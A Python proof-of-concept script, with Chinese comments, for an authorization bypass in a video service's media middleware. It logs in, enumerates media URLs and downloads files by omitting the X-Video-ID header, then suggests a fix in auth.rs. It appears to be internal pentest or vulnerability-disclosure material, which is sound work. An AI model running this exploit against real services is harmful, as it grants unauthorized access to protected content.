#!/usr/bin/env python3
"""
PoC: media_auth 播放会话绕过漏洞
==================================
漏洞位置: backend/src/middleware/auth.rs:72-82
漏洞原理: media_auth 只在 X-Video-ID header 存在时检查播放会话，
          缺失时直接放行，任何已登录用户都能下载 /media/* 下所有文件。
"""

import sys
import json
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8082"
TEST_USER = "pentest_user_002"
TEST_PASS = "Pentest@12345"


def api(method, path, data=None, headers=None):
    url = f"{BASE_URL}{path}"
    hdrs = headers or {}
    body = json.dumps(data).encode() if data else None
    if body:
        hdrs["Content-Type"] = "application/json"
    req = Request(url, data=body, headers=hdrs, method=method)
    try:
        resp = urlopen(req, timeout=10)
        return resp.status, json.loads(resp.read())
    except HTTPError as e:
        body = e.read().decode(errors="replace")
        try:
            body = json.loads(body)
        except Exception:
            pass
        return e.code, body
    except URLError as e:
        return 0, str(e.reason)


def main():
    print("=" * 60)
    print("  PoC: media_auth 播放会话绕过漏洞")
    print("=" * 60)

    # 1. 连接检查
    print(f"\n[1] 连接 {BASE_URL}")
    code, _ = api("GET", "/health")
    if code != 200:
        print(f"    服务不可达: {code}")
        sys.exit(1)
    print(f"    服务在线")

    # 2. 注册或登录获取 token
    print(f"\n[2] 认证")
    token = None
    code, resp = api("POST", "/auth/register",
                     {"username": TEST_USER, "password": TEST_PASS})
    if code == 200 and isinstance(resp, dict):
        if resp.get("token"):
            token = resp["token"]
            print(f"    注册成功，已获取 token")
        elif resp.get("ok") is False:
            print(f"    注册: {resp.get('error', '')}")

    if not token:
        code, resp = api("POST", "/auth/login",
                         {"username": TEST_USER, "password": TEST_PASS})
        if code == 200 and isinstance(resp, dict) and resp.get("token"):
            token = resp["token"]
            print(f"    登录成功")
        else:
            print(f"    登录失败: {resp}")
            sys.exit(1)

    print(f"    token = {token[:20]}...")

    # 3. 枚举媒体文件
    print(f"\n[3] 枚举媒体文件")
    code, resp = api("GET", "/videos",
                     headers={"Authorization": f"Bearer {token}"})
    videos = resp.get("videos", []) if isinstance(resp, dict) else []
    media_urls = []
    for v in videos:
        su = v.get("stream_url", "")
        if su:
            media_urls.append(su)
        cu = v.get("cover_url", "")
        if cu:
            media_urls.append(cu)
    print(f"    找到 {len(media_urls)} 个媒体 URL")

    if not media_urls:
        print("    无可利用的文件")
        sys.exit(1)

    # 4. 漏洞利用
    print(f"\n[4] 漏洞利用")
    success = 0
    for url in media_urls[:3]:
        print(f"\n  --- 目标: {url} ---")

        # 场景1: 带 X-Video-ID → 应被拒绝
        print(f"  场景1: 带 X-Video-ID:99999（无活跃会话）")
        code, resp = api("GET", url, headers={
            "Authorization": f"Bearer {token}",
            "X-Video-ID": "99999",
        })
        print(f"         状态码: {code}", end="")
        if code == 403:
            print(f"  [拒绝] 正确")
        else:
            print(f"  [意外]")

        # 场景2: 不带 X-Video-ID → 绕过检查
        print(f"  场景2: 不带 X-Video-ID（攻击绕过）")
        full_url = f"{BASE_URL}{url}"
        req = Request(full_url, method="GET")
        req.add_header("Authorization", f"Bearer {token}")
        try:
            resp = urlopen(req, timeout=10)
            ct = resp.headers.get("Content-Type", "")
            cl = resp.headers.get("Content-Length", "?")
            print(f"         状态码: {resp.status}")
            print(f"         Content-Type: {ct}")
            print(f"         Content-Length: {cl}")
            chunk = resp.read(64)
            print(f"         数据前缀: {chunk}")
            resp.close()
            print(f"         [!!!] 漏洞利用成功！绕过播放会话检查")
            success += 1
        except HTTPError as e:
            print(f"         状态码: {e.code}  [拒绝]")
        except Exception as e:
            print(f"         异常: {e}")

    print(f"\n{'=' * 60}")
    print(f"  结果: {success}/{min(len(media_urls), 3)} 个文件成功绕过")
    print(f"  修复: auth.rs:72-82 移除 if let，改为必填校验")
    print(f"{'=' * 60}")


if __name__ == "__main__":
    main()
